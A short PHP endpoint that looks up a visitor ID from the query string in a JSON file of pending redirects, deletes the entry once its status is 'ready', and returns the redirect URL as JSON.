<?php
session_start();
error_log("Check redirect started");

header('Content-Type: application/json');

$visitor_id = $_GET['visitor_id'] ?? '';
error_log("Checking redirect for visitor: " . $visitor_id);

if (empty($visitor_id)) {
    die(json_encode(['redirect' => false]));
}

$redirects_file = __DIR__ . '/session/redirects.json';
if (!file_exists($redirects_file)) {
    die(json_encode(['redirect' => false]));
}

$redirects = json_decode(file_get_contents($redirects_file), true);

if (isset($redirects['redirects'][$visitor_id])) {
    $visitor_data = $redirects['redirects'][$visitor_id];
    
    if ($visitor_data['status'] === 'ready' && isset($visitor_data['redirect_url'])) {
        // Remove this visitor's data
        unset($redirects['redirects'][$visitor_id]);
        file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));
        
        echo json_encode([
            'redirect' => true,
            'redirect_url' => $visitor_data['redirect_url']
        ]);
    } else {
        echo json_encode(['redirect' => false]);
    }
} else {
    echo json_encode(['redirect' => false]);
} 